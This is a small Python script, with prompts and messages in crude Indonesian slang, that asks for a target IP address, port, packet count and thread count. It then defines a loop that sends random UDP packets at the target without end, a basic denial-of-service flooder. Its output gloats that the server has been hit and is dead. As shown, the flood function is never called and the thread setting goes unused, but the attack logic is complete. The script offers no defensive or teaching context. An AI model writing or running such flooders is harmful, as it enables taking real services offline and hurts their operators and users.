import random
import socket
import threading
import os,sys

print ("""pdpepek

pepepeoek""")
os.system("clear")

ip = str(input("\033[93mip nya asuh:"))
port = int(input("\033[93mport nya asuh:"))
times = int(input("\033[93mpaket nyA asuh:"))
threads = int(input("\033[93mbonus paket nya:"))
def run():
	data = random._urandom(155)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(" yahahahha kena ddos!")
		except:
			print("lol mati server nya wkwkwow")
